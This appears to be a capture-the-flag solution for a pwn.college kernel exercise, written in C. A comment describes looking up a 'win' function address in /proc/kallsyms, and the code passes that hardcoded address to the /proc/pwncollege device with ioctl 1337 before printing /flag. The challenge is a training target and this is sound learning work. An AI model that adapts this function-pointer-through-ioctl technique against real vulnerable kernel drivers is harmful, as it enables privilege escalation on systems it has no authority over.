/*
use ioctl to write the flag to /proc/pwncollege
exp:
1. login in as practice mode, vm connect and sudo su to cat /proc/kallsyms, find the win address
2. pass the win address to device and IOCTL as 1337
*/
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#define IOCTL_CMD 1337
const char DEVICE_PATH[] = "/proc/pwncollege";
const unsigned long win_addr = 0xffffffffc0000f62;


int main() {
    int fd = open(DEVICE_PATH, O_WRONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    ssize_t written_size = ioctl(fd, IOCTL_CMD, win_addr);
    printf("password written to device successfully.\n");
    system("cat /flag");
    close(fd);
    return 0;
}
